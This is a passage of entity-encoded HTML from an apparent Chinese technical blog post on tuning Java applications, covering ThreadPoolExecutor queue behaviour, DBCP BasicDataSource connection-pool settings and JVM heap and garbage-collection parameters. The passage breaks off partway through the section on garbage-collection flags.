title=\"1.Java&#x7EBF;&#x7A0B;&#x6C60;&#xFF08;java.util.concurrent.ThreadPoolExecutor&#xFF09;\"></a>1.Java&#x7EBF;&#x7A0B;&#x6C60;&#xFF08;java.util.concurrent.ThreadPoolExecutor&#xFF09;</h4><p>&#x5927;&#x591A;&#x6570;JVM6&#x4E0A;&#x7684;&#x5E94;&#x7528;&#x91C7;&#x7528;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x90FD;&#x662F;JDK&#x81EA;&#x5E26;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x4E4B;&#x6240;&#x4EE5;&#x628A;&#x6210;&#x719F;&#x7684;Java&#x7EBF;&#x7A0B;&#x6C60;&#x8FDB;&#x884C;&#x7F57;&#x55E6;&#x8BF4;&#x660E;&#xFF0C;&#x662F;&#x56E0;&#x4E3A;&#x8BE5;&#x7EBF;&#x7A0B;&#x6C60;&#x7684;&#x884C;&#x4E3A;&#x4E0E;&#x6211;&#x4EEC;&#x60F3;&#x8C61;&#x7684;&#x6709;&#x70B9;&#x51FA;&#x5165;&#x3002;Java&#x7EBF;&#x7A0B;&#x6C60;&#x6709;&#x51E0;&#x4E2A;&#x91CD;&#x8981;&#x7684;&#x914D;&#x7F6E;&#x53C2;&#x6570;&#xFF1A;</p>\n<ul>\n<li>corePoolSize&#xFF1A;&#x6838;&#x5FC3;&#x7EBF;&#x7A0B;&#x6570;&#xFF08;&#x6700;&#x65B0;&#x7EBF;&#x7A0B;&#x6570;&#xFF09;</li>\n<li>maximumPoolSize&#xFF1A;&#x6700;&#x5927;&#x7EBF;&#x7A0B;&#x6570;&#xFF0C;&#x8D85;&#x8FC7;&#x8FD9;&#x4E2A;&#x6570;&#x91CF;&#x7684;&#x4EFB;&#x52A1;&#x4F1A;&#x88AB;&#x62D2;&#x7EDD;&#xFF0C;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;RejectedExecutionHandler&#x63A5;&#x53E3;&#x81EA;&#x5B9A;&#x4E49;&#x5904;&#x7406;&#x65B9;&#x5F0F;</li>\n<li>keepAliveTime&#xFF1A;&#x7EBF;&#x7A0B;&#x4FDD;&#x6301;&#x6D3B;&#x52A8;&#x7684;&#x65F6;&#x95F4;</li>\n<li>workQueue&#xFF1A;&#x5DE5;&#x4F5C;&#x961F;&#x5217;&#xFF0C;&#x5B58;&#x653E;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1;</li>\n</ul>\n<p>Java&#x7EBF;&#x7A0B;&#x6C60;&#x9700;&#x8981;&#x4F20;&#x5165;&#x4E00;&#x4E2A;Queue&#x53C2;&#x6570;&#xFF08;workQueue&#xFF09;&#x7528;&#x6765;&#x5B58;&#x653E;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1;&#xFF0C;&#x800C;&#x5BF9;Queue&#x7684;&#x4E0D;&#x540C;&#x9009;&#x62E9;&#xFF0C;&#x7EBF;&#x7A0B;&#x6C60;&#x6709;&#x5B8C;&#x5168;&#x4E0D;&#x540C;&#x7684;&#x884C;&#x4E3A;&#xFF1A;</p>\n<ul>\n<li>SynchronousQueue&#xFF1A; &#x4E00;&#x4E2A;&#x65E0;&#x5BB9;&#x91CF;&#x7684;&#x7B49;&#x5F85;&#x961F;&#x5217;&#xFF0C;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x7684;insert&#x64CD;&#x4F5C;&#x5FC5;&#x987B;&#x7B49;&#x5F85;&#x53E6;&#x4E00;&#x7EBF;&#x7A0B;&#x7684;remove&#x64CD;&#x4F5C;&#xFF0C;&#x91C7;&#x7528;&#x8FD9;&#x4E2A;Queue&#x7EBF;&#x7A0B;&#x6C60;&#x5C06;&#x4F1A;&#x4E3A;&#x6BCF;&#x4E2A;&#x4EFB;&#x52A1;&#x5206;&#x914D;&#x4E00;&#x4E2A;&#x65B0;&#x7EBF;&#x7A0B;</li>\n<li>LinkedBlockingQueue &#xFF1A; &#x65E0;&#x754C;&#x961F;&#x5217;&#xFF0C;&#x91C7;&#x7528;&#x8BE5;Queue&#xFF0C;&#x7EBF;&#x7A0B;&#x6C60;&#x5C06;&#x5FFD;&#x7565; maximumPoolSize&#x53C2;&#x6570;&#xFF0C;&#x4EC5;&#x7528;corePoolSize&#x7684;&#x7EBF;&#x7A0B;&#x5904;&#x7406;&#x6240;&#x6709;&#x7684;&#x4EFB;&#x52A1;&#xFF0C;&#x672A;&#x5904;&#x7406;&#x7684;&#x4EFB;&#x52A1;&#x4FBF;&#x5728;LinkedBlockingQueue&#x4E2D;&#x6392;&#x961F;</li>\n<li>ArrayBlockingQueue&#xFF1A; &#x6709;&#x754C;&#x961F;&#x5217;&#xFF0C;&#x5728;&#x6709;&#x754C;&#x961F;&#x5217;&#x548C; maximumPoolSize&#x7684;&#x4F5C;&#x7528;&#x4E0B;&#xFF0C;&#x7A0B;&#x5E8F;&#x5C06;&#x5F88;&#x96BE;&#x88AB;&#x8C03;&#x4F18;&#xFF1A;&#x66F4;&#x5927;&#x7684;Queue&#x548C;&#x5C0F;&#x7684;maximumPoolSize&#x5C06;&#x5BFC;&#x81F4;CPU&#x7684;&#x4F4E;&#x8D1F;&#x8F7D;&#xFF1B;&#x5C0F;&#x7684;Queue&#x548C;&#x5927;&#x7684;&#x6C60;&#xFF0C;Queue&#x5C31;&#x6CA1;&#x8D77;&#x52A8;&#x5E94;&#x6709;&#x7684;&#x4F5C;&#x7528;&#x3002;</li>\n</ul>\n<p>&#x5176;&#x5B9E;&#x6211;&#x4EEC;&#x7684;&#x8981;&#x6C42;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x5E0C;&#x671B;&#x7EBF;&#x7A0B;&#x6C60;&#x80FD;&#x8DDF;&#x8FDE;&#x63A5;&#x6C60;&#x4E00;&#x6837;&#xFF0C;&#x80FD;&#x8BBE;&#x7F6E;&#x6700;&#x5C0F;&#x7EBF;&#x7A0B;&#x6570;&#x3001;&#x6700;&#x5927;&#x7EBF;&#x7A0B;&#x6570;&#xFF0C;&#x5F53;&#x6700;&#x5C0F;&#x6570;&lt;&#x4EFB;&#x52A1;&lt;&#x6700;&#x5927;&#x6570;&#x65F6;&#xFF0C;&#x5E94;&#x8BE5;&#x5206;&#x914D;&#x65B0;&#x7684;&#x7EBF;&#x7A0B;&#x5904;&#x7406;&#xFF1B;&#x5F53;&#x4EFB;&#x52A1;&gt;&#x6700;&#x5927;&#x6570;&#x65F6;&#xFF0C;&#x5E94;&#x8BE5;&#x7B49;&#x5F85;&#x6709;&#x7A7A;&#x95F2;&#x7EBF;&#x7A0B;&#x518D;&#x5904;&#x7406;&#x8BE5;&#x4EFB;&#x52A1;&#x3002;</p>\n<p>&#x4F46;&#x7EBF;&#x7A0B;&#x6C60;&#x7684;&#x8BBE;&#x8BA1;&#x601D;&#x8DEF;&#x662F;&#xFF0C;&#x4EFB;&#x52A1;&#x5E94;&#x8BE5;&#x653E;&#x5230;Queue&#x4E2D;&#xFF0C;&#x5F53;Queue&#x653E;&#x4E0D;&#x4E0B;&#x65F6;&#x518D;&#x8003;&#x8651;&#x7528;&#x65B0;&#x7EBF;&#x7A0B;&#x5904;&#x7406;&#xFF0C;&#x5982;&#x679C;Queue&#x6EE1;&#x4E14;&#x65E0;&#x6CD5;&#x6D3E;&#x751F;&#x65B0;&#x7EBF;&#x7A0B;&#xFF0C;&#x5C31;&#x62D2;&#x7EDD;&#x8BE5;&#x4EFB;&#x52A1;&#x3002;&#x8BBE;&#x8BA1;&#x5BFC;&#x81F4;&#x201C;&#x5148;&#x653E;&#x7B49;&#x6267;&#x884C;&#x201D;&#x3001;&#x201C;&#x653E;&#x4E0D;&#x4E0B;&#x518D;&#x6267;&#x884C;&#x201D;&#x3001;&#x201C;&#x62D2;&#x7EDD;&#x4E0D;&#x7B49;&#x5F85;&#x201D;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x6839;&#x636E;&#x4E0D;&#x540C;&#x7684;Queue&#x53C2;&#x6570;&#xFF0C;&#x8981;&#x63D0;&#x9AD8;&#x541E;&#x5410;&#x91CF;&#x4E0D;&#x80FD;&#x4E00;&#x5473;&#x5730;&#x589E;&#x5927;maximumPoolSize&#x3002;</p>\n<p>&#x5F53;&#x7136;&#xFF0C;&#x8981;&#x8FBE;&#x5230;&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x6807;&#xFF0C;&#x5FC5;&#x987B;&#x5BF9;&#x7EBF;&#x7A0B;&#x6C60;&#x8FDB;&#x884C;&#x4E00;&#x5B9A;&#x7684;&#x5C01;&#x88C5;&#xFF0C;&#x5E78;&#x8FD0;&#x7684;&#x662F;ThreadPoolExecutor&#x4E2D;&#x7559;&#x4E86;&#x8DB3;&#x591F;&#x7684;&#x81EA;&#x5B9A;&#x4E49;&#x63A5;&#x53E3;&#x4EE5;&#x5E2E;&#x52A9;&#x6211;&#x4EEC;&#x8FBE;&#x5230;&#x76EE;&#x6807;&#x3002;&#x6211;&#x4EEC;&#x5C01;&#x88C5;&#x7684;&#x65B9;&#x5F0F;&#x662F;&#xFF1A;</p>\n<ul>\n<li>&#x4EE5;SynchronousQueue&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#xFF0C;&#x4F7F;maximumPoolSize&#x53D1;&#x6325;&#x4F5C;&#x7528;&#xFF0C;&#x4EE5;&#x9632;&#x6B62;&#x7EBF;&#x7A0B;&#x88AB;&#x65E0;&#x9650;&#x5236;&#x7684;&#x5206;&#x914D;&#xFF0C;&#x540C;&#x65F6;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x63D0;&#x9AD8;maximumPoolSize&#x6765;&#x63D0;&#x9AD8;&#x7CFB;&#x7EDF;&#x541E;&#x5410;&#x91CF;</li>\n<li>&#x81EA;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;RejectedExecutionHandler&#xFF0C;&#x5F53;&#x7EBF;&#x7A0B;&#x6570;&#x8D85;&#x8FC7;maximumPoolSize&#x65F6;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x5904;&#x7406;&#x65B9;&#x5F0F;&#x4E3A;&#x9694;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x68C0;&#x67E5;&#x7EBF;&#x7A0B;&#x6C60;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x65B0;Task&#xFF0C;&#x5982;&#x679C;&#x53EF;&#x4EE5;&#x628A;&#x62D2;&#x7EDD;&#x7684;Task&#x91CD;&#x65B0;&#x653E;&#x5165;&#x5230;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x68C0;&#x67E5;&#x7684;&#x65F6;&#x95F4;&#x4F9D;&#x8D56;keepAliveTime&#x7684;&#x5927;&#x5C0F;&#x3002;</li>\n</ul>\n<h4 id=\"2-&#x8FDE;&#x63A5;&#x6C60;&#xFF08;org-apache-commons-dbcp-BasicDataSource&#xFF09;\"><a href=\"#2-&#x8FDE;&#x63A5;&#x6C60;&#xFF08;org-apache-commons-dbcp-BasicDataSource&#xFF09;\" class=\"headerlink\" title=\"2.&#x8FDE;&#x63A5;&#x6C60;&#xFF08;org.apache.commons.dbcp.BasicDataSource&#xFF09;\"></a>2.&#x8FDE;&#x63A5;&#x6C60;&#xFF08;org.apache.commons.dbcp.BasicDataSource&#xFF09;</h4><p>&#x5728;&#x4F7F;&#x7528;org.apache.commons.dbcp.BasicDataSource&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x56E0;&#x4E3A;&#x4E4B;&#x524D;&#x91C7;&#x7528;&#x4E86;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF0C;&#x6240;&#x4EE5;&#x5F53;&#x8BBF;&#x95EE;&#x91CF;&#x5927;&#x65F6;&#xFF0C;&#x901A;&#x8FC7;JMX&#x89C2;&#x5BDF;&#x5230;&#x5F88;&#x591A;Tomcat&#x7EBF;&#x7A0B;&#x90FD;&#x963B;&#x585E;&#x5728;BasicDataSource&#x4F7F;&#x7528;&#x7684;Apache ObjectPool&#x7684;&#x9501;&#x4E0A;&#xFF0C;&#x76F4;&#x63A5;&#x539F;&#x56E0;&#x5F53;&#x65F6;&#x662F;&#x56E0;&#x4E3A;BasicDataSource&#x8FDE;&#x63A5;&#x6C60;&#x7684;&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x6570;&#x8BBE;&#x7F6E;&#x7684;&#x592A;&#x5C0F;&#xFF0C;&#x9ED8;&#x8BA4;&#x7684;BasicDataSource&#x914D;&#x7F6E;&#xFF0C;&#x4EC5;&#x4F7F;&#x7528;8&#x4E2A;&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x3002;</p>\n<p>&#x6211;&#x8FD8;&#x89C2;&#x5BDF;&#x5230;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5F53;&#x8F83;&#x957F;&#x7684;&#x65F6;&#x95F4;&#x4E0D;&#x8BBF;&#x95EE;&#x7CFB;&#x7EDF;&#xFF0C;&#x6BD4;&#x5982;2&#x5929;&#xFF0C;DB&#x4E0A;&#x7684;Mysql&#x4F1A;&#x65AD;&#x6389;&#x6240;&#x4EE5;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x5BFC;&#x81F4;&#x8FDE;&#x63A5;&#x6C60;&#x4E2D;&#x7F13;&#x5B58;&#x7684;&#x8FDE;&#x63A5;&#x4E0D;&#x80FD;&#x7528;&#x3002;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x8FD9;&#x4E9B;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x5145;&#x5206;&#x7814;&#x7A76;&#x4E86;BasicDataSource&#xFF0C;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E9B;&#x4F18;&#x5316;&#x7684;&#x70B9;&#xFF1A;</p>\n<ul>\n<li>Mysql&#x9ED8;&#x8BA4;&#x652F;&#x6301;100&#x4E2A;&#x94FE;&#x63A5;&#xFF0C;&#x6240;&#x4EE5;&#x6BCF;&#x4E2A;&#x8FDE;&#x63A5;&#x6C60;&#x7684;&#x914D;&#x7F6E;&#x8981;&#x6839;&#x636E;&#x96C6;&#x7FA4;&#x4E2D;&#x7684;&#x673A;&#x5668;&#x6570;&#x8FDB;&#x884C;&#xFF0C;&#x5982;&#x6709;2&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x53EF;&#x6BCF;&#x4E2A;&#x8BBE;&#x7F6E;&#x4E3A;60</li>\n<li>initialSize&#xFF1A;&#x53C2;&#x6570;&#x662F;&#x4E00;&#x76F4;&#x6253;&#x5F00;&#x7684;&#x8FDE;&#x63A5;&#x6570;</li>\n<li>minEvictableIdleTimeMillis&#xFF1A;&#x8BE5;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x6BCF;&#x4E2A;&#x8FDE;&#x63A5;&#x7684;&#x7A7A;&#x95F2;&#x65F6;&#x95F4;&#xFF0C;&#x8D85;&#x8FC7;&#x8FD9;&#x4E2A;&#x65F6;&#x95F4;&#x8FDE;&#x63A5;&#x5C06;&#x88AB;&#x5173;&#x95ED;</li>\n<li>timeBetweenEvictionRunsMillis&#xFF1A;&#x540E;&#x53F0;&#x7EBF;&#x7A0B;&#x7684;&#x8FD0;&#x884C;&#x5468;&#x671F;&#xFF0C;&#x7528;&#x6765;&#x68C0;&#x6D4B;&#x8FC7;&#x671F;&#x8FDE;&#x63A5;</li>\n<li>maxActive&#xFF1A;&#x6700;&#x5927;&#x80FD;&#x5206;&#x914D;&#x7684;&#x8FDE;&#x63A5;&#x6570;</li>\n<li>maxIdle&#xFF1A;&#x6700;&#x5927;&#x7A7A;&#x95F2;&#x6570;&#xFF0C;&#x5F53;&#x8FDE;&#x63A5;&#x4F7F;&#x7528;&#x5B8C;&#x6BD5;&#x540E;&#x53D1;&#x73B0;&#x8FDE;&#x63A5;&#x6570;&#x5927;&#x4E8E;maxIdle&#xFF0C;&#x8FDE;&#x63A5;&#x5C06;&#x88AB;&#x76F4;&#x63A5;&#x5173;&#x95ED;&#x3002;&#x53EA;&#x6709;initialSize &lt; x &lt; </li>\n<li>maxIdle&#x7684;&#x8FDE;&#x63A5;&#x5C06;&#x88AB;&#x5B9A;&#x671F;&#x68C0;&#x6D4B;&#x662F;&#x5426;&#x8D85;&#x671F;&#x3002;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x4E3B;&#x8981;&#x7528;&#x6765;&#x5728;&#x5CF0;&#x503C;&#x8BBF;&#x95EE;&#x65F6;&#x63D0;&#x9AD8;&#x541E;&#x5410;&#x91CF;&#x3002;</li>\n<li>initialSize&#x662F;&#x5982;&#x4F55;&#x4FDD;&#x6301;&#x7684;&#xFF1F;&#x7ECF;&#x8FC7;&#x7814;&#x7A76;&#x4EE3;&#x7801;&#x53D1;&#x73B0;&#xFF0C;BasicDataSource&#x4F1A;&#x5173;&#x95ED;&#x6240;&#x6709;&#x8D85;&#x671F;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x6253;&#x5F00;initialSize&#x6570;&#x91CF;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x4E0E;minEvictableIdleTimeMillis&#x3001;timeBetweenEvictionRunsMillis&#x4E00;&#x8D77;&#x4FDD;&#x8BC1;&#x4E86;&#x6240;&#x6709;&#x8D85;&#x671F;&#x7684;initialSize&#x8FDE;&#x63A5;&#x90FD;&#x4F1A;&#x88AB;&#x91CD;&#x65B0;&#x8FDE;&#x63A5;&#xFF0C;&#x4ECE;&#x800C;&#x907F;&#x514D;&#x4E86;Mysql&#x957F;&#x65F6;&#x95F4;&#x65E0;&#x52A8;&#x4F5C;&#x4F1A;&#x65AD;&#x6389;&#x8FDE;&#x63A5;&#x7684;&#x95EE;&#x9898;&#x3002;</li>\n</ul>\n<h4 id=\"3-JVM&#x53C2;&#x6570;\"><a href=\"#3-JVM&#x53C2;&#x6570;\" class=\"headerlink\" title=\"3.JVM&#x53C2;&#x6570;\"></a>3.JVM&#x53C2;&#x6570;</h4><p>&#x5728;JVM&#x542F;&#x52A8;&#x53C2;&#x6570;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x8DDF;&#x5185;&#x5B58;&#x3001;&#x5783;&#x573E;&#x56DE;&#x6536;&#x76F8;&#x5173;&#x7684;&#x4E00;&#x4E9B;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#xFF0C;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0D;&#x505A;&#x4EFB;&#x4F55;&#x8BBE;&#x7F6E;JVM&#x4F1A;&#x5DE5;&#x4F5C;&#x7684;&#x5F88;&#x597D;&#xFF0C;&#x4F46;&#x5BF9;&#x4E00;&#x4E9B;&#x914D;&#x7F6E;&#x5F88;&#x597D;&#x7684;Server&#x548C;&#x5177;&#x4F53;&#x7684;&#x5E94;&#x7528;&#x5FC5;&#x987B;&#x4ED4;&#x7EC6;&#x8C03;&#x4F18;&#x624D;&#x80FD;&#x83B7;&#x5F97;&#x6700;&#x4F73;&#x6027;&#x80FD;&#x3002;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;&#x6211;&#x4EEC;&#x5E0C;&#x671B;&#x8FBE;&#x5230;&#x4E00;&#x4E9B;&#x76EE;&#x6807;&#xFF1A;</p>\n<ul>\n<li>GC&#x7684;&#x65F6;&#x95F4;&#x8DB3;&#x591F;&#x7684;&#x5C0F;</li>\n<li>GC&#x7684;&#x6B21;&#x6570;&#x8DB3;&#x591F;&#x7684;&#x5C11;</li>\n<li>&#x53D1;&#x751F;Full GC&#x7684;&#x5468;&#x671F;&#x8DB3;&#x591F;&#x7684;&#x957F;</li>\n</ul>\n<p>&#x524D;&#x4E24;&#x4E2A;&#x76EE;&#x524D;&#x662F;&#x76F8;&#x6096;&#x7684;&#xFF0C;&#x8981;&#x60F3;GC&#x65F6;&#x95F4;&#x5C0F;&#x5FC5;&#x987B;&#x8981;&#x4E00;&#x4E2A;&#x66F4;&#x5C0F;&#x7684;&#x5806;&#xFF0C;&#x8981;&#x4FDD;&#x8BC1;GC&#x6B21;&#x6570;&#x8DB3;&#x591F;&#x5C11;&#xFF0C;&#x5FC5;&#x987B;&#x4FDD;&#x8BC1;&#x4E00;&#x4E2A;&#x66F4;&#x5927;&#x7684;&#x5806;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x80FD;&#x53D6;&#x5176;&#x5E73;&#x8861;&#x3002;</p>\n<ul>\n<li><p>&#x9488;&#x5BF9;JVM&#x5806;&#x7684;&#x8BBE;&#x7F6E;&#x4E00;&#x822C;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;-Xms -Xmx&#x9650;&#x5B9A;&#x5176;&#x6700;&#x5C0F;&#x3001;&#x6700;&#x5927;&#x503C;&#xFF0C;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x5783;&#x573E;&#x6536;&#x96C6;&#x5668;&#x5728;&#x6700;&#x5C0F;&#x3001;&#x6700;&#x5927;&#x4E4B;&#x95F4;&#x6536;&#x7F29;&#x5806;&#x800C;&#x4EA7;&#x751F;&#x989D;&#x5916;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x6211;&#x4EEC;&#x901A;&#x5E38;&#x628A;&#x6700;&#x5927;&#x3001;&#x6700;&#x5C0F;&#x8BBE;&#x7F6E;&#x4E3A;&#x76F8;&#x540C;&#x7684;&#x503C;</p>\n</li>\n<li><p>&#x5E74;&#x8F7B;&#x4EE3;&#x548C;&#x5E74;&#x8001;&#x4EE3;&#x5C06;&#x6839;&#x636E;&#x9ED8;&#x8BA4;&#x7684;&#x6BD4;&#x4F8B;&#xFF08;1&#xFF1A;2&#xFF09;&#x5206;&#x914D;&#x5806;&#x5185;&#x5B58;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8C03;&#x6574;&#x4E8C;&#x8005;&#x4E4B;&#x95F4;&#x7684;&#x6BD4;&#x7387;NewRadio&#x6765;&#x8C03;&#x6574;&#x4E8C;&#x8005;&#x4E4B;&#x95F4;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x9488;&#x5BF9;&#x56DE;&#x6536;&#x4EE3;&#xFF0C;&#x6BD4;&#x5982;&#x5E74;&#x8F7B;&#x4EE3;&#xFF0C;&#x901A;&#x8FC7; -XX:newSize -XX:MaxNewSize&#x6765;&#x8BBE;&#x7F6E;&#x5176;&#x7EDD;&#x5BF9;&#x5927;&#x5C0F;&#x3002;&#x540C;&#x6837;&#xFF0C;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x5E74;&#x8F7B;&#x4EE3;&#x7684;&#x5806;&#x6536;&#x7F29;&#xFF0C;&#x6211;&#x4EEC;&#x901A;&#x5E38;&#x4F1A;&#x628A;-XX:newSize -XX:MaxNewSize&#x8BBE;&#x7F6E;&#x4E3A;&#x540C;&#x6837;&#x5927;&#x5C0F;</p>\n</li>\n<li><p>&#x5E74;&#x8F7B;&#x4EE3;&#x548C;&#x5E74;&#x8001;&#x4EE3;&#x8BBE;&#x7F6E;&#x591A;&#x5927;&#x624D;&#x7B97;&#x5408;&#x7406;&#xFF1F;&#x8FD9;&#x4E2A;&#x6211;&#x95EE;&#x9898;&#x6BEB;&#x65E0;&#x7591;&#x95EE;&#x662F;&#x6CA1;&#x6709;&#x7B54;&#x6848;&#x7684;&#xFF0C;&#x5426;&#x5219;&#x4E5F;&#x5C31;&#x4E0D;&#x4F1A;&#x6709;&#x8C03;&#x4F18;&#x3002;&#x6211;&#x4EEC;&#x89C2;&#x5BDF;&#x4E00;&#x4E0B;&#x4E8C;&#x8005;&#x5927;&#x5C0F;&#x53D8;&#x5316;&#x6709;&#x54EA;&#x4E9B;&#x5F71;&#x54CD;&#xFF1A;<br>&#xFF08;1&#xFF09;&#x66F4;&#x5927;&#x7684;&#x5E74;&#x8F7B;&#x4EE3;&#x5FC5;&#x7136;&#x5BFC;&#x81F4;&#x66F4;&#x5C0F;&#x7684;&#x5E74;&#x8001;&#x4EE3;&#xFF0C;&#x5927;&#x7684;&#x5E74;&#x8F7B;&#x4EE3;&#x4F1A;&#x5EF6;&#x957F;&#x666E;&#x901A;GC&#x7684;&#x5468;&#x671F;&#xFF0C;&#x4F46;&#x4F1A;&#x589E;&#x52A0;&#x6BCF;&#x6B21;GC&#x7684;&#x65F6;&#x95F4;&#xFF1B;&#x5C0F;&#x7684;&#x5E74;&#x8001;&#x4EE3;&#x4F1A;&#x5BFC;&#x81F4;&#x66F4;&#x9891;&#x7E41;&#x7684;Full GC&#x3002;<br>&#xFF08;2&#xFF09;&#x66F4;&#x5C0F;&#x7684;&#x5E74;&#x8F7B;&#x4EE3;&#x5FC5;&#x7136;&#x5BFC;&#x81F4;&#x66F4;&#x5927;&#x5E74;&#x8001;&#x4EE3;&#xFF0C;&#x5C0F;&#x7684;&#x5E74;&#x8F7B;&#x4EE3;&#x4F1A;&#x5BFC;&#x81F4;&#x666E;&#x901A;GC&#x5F88;&#x9891;&#x7E41;&#xFF0C;&#x4F46;&#x6BCF;&#x6B21;&#x7684;GC&#x65F6;&#x95F4;&#x4F1A;&#x66F4;&#x77ED;&#xFF1B;&#x5927;&#x7684;&#x5E74;&#x8001;&#x4EE3;&#x4F1A;&#x51CF;&#x5C11;Full GC&#x7684;&#x9891;&#x7387;&#x3002;<br>&#xFF08;3&#xFF09;&#x5982;&#x4F55;&#x9009;&#x62E9;&#x5E94;&#x8BE5;&#x4F9D;&#x8D56;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5BF9;&#x8C61;&#x751F;&#x547D;&#x5468;&#x671F;&#x7684;&#x5206;&#x5E03;&#x60C5;&#x51B5;&#xFF1A;<br>&#x5982;&#x679C;&#x5E94;&#x7528;&#x5B58;&#x5728;&#x5927;&#x91CF;&#x7684;&#x4E34;&#x65F6;&#x5BF9;&#x8C61;&#xFF0C;&#x5E94;&#x8BE5;&#x9009;&#x62E9;&#x66F4;&#x5927;&#x7684;&#x5E74;&#x8F7B;&#x4EE3;&#xFF1B;<br>&#x5982;&#x679C;&#x5B58;&#x5728;&#x76F8;&#x5BF9;&#x8F83;&#x591A;&#x7684;&#x6301;&#x4E45;&#x5BF9;&#x8C61;&#xFF0C;&#x5E74;&#x8001;&#x4EE3;&#x5E94;&#x8BE5;&#x9002;&#x5F53;&#x589E;&#x5927;&#x3002;<br>&#x4F46;&#x5F88;&#x591A;&#x5E94;&#x7528;&#x90FD;&#x6CA1;&#x6709;&#x8FD9;&#x6837;&#x660E;&#x663E;&#x7684;&#x7279;&#x6027;&#xFF0C;&#x5728;&#x6289;&#x62E9;&#x65F6;&#x5E94;&#x8BE5;&#x6839;&#x636E;&#x4EE5;&#x4E0B;&#x4E24;&#x70B9;&#xFF1A;<br>&#xFF08;A&#xFF09;&#x672C;&#x7740;Full GC&#x5C3D;&#x91CF;&#x5C11;&#x7684;&#x539F;&#x5219;&#xFF0C;&#x8BA9;&#x5E74;&#x8001;&#x4EE3;&#x5C3D;&#x91CF;&#x7F13;&#x5B58;&#x5E38;&#x7528;&#x5BF9;&#x8C61;&#xFF0C;JVM&#x7684;&#x9ED8;&#x8BA4;&#x6BD4;&#x4F8B;1&#xFF1A;2&#x4E5F;&#x662F;&#x8FD9;&#x4E2A;&#x9053;&#x7406;<br>&#xFF08;B&#xFF09;&#x901A;&#x8FC7;&#x89C2;&#x5BDF;&#x5E94;&#x7528;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#xFF0C;&#x770B;&#x5176;&#x4ED6;&#x5728;&#x5CF0;&#x503C;&#x65F6;&#x5E74;&#x8001;&#x4EE3;&#x4F1A;&#x5360;&#x591A;&#x5C11;&#x5185;&#x5B58;&#xFF0C;&#x5728;&#x4E0D;&#x5F71;&#x54CD;Full GC&#x7684;&#x524D;&#x63D0;&#x4E0B;&#xFF0C;&#x6839;&#x636E;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x52A0;&#x5927;&#x5E74;&#x8F7B;&#x4EE3;&#xFF0C;&#x6BD4;&#x5982;&#x53EF;&#x4EE5;&#x628A;&#x6BD4;&#x4F8B;&#x63A7;&#x5236;&#x5728;1&#xFF1A;1&#x3002;&#x4F46;&#x5E94;&#x8BE5;&#x7ED9;&#x5E74;&#x8001;&#x4EE3;&#x81F3;&#x5C11;&#x9884;&#x7559;1/3&#x7684;&#x589E;&#x957F;&#x7A7A;&#x95F4;</p>\n</li>\n<li><p>&#x5728;&#x914D;&#x7F6E;&#x8F83;&#x597D;&#x7684;&#x673A;&#x5668;&#x4E0A;&#xFF08;&#x6BD4;&#x5982;&#x591A;&#x6838;&#x3001;&#x5927;&#x5185;&#x5B58;&#xFF09;&#xFF0C;&#x53EF;&#x4EE5;&#x4E3A;&#x5E74;&#x8001;&#x4EE3;&#x9009;&#x62E9;&#x5E76;&#x884C;&#x6536;&#x96C6;&#x7B97;&#x6CD5;&#xFF1A; -XX:+UseParallelOldGC 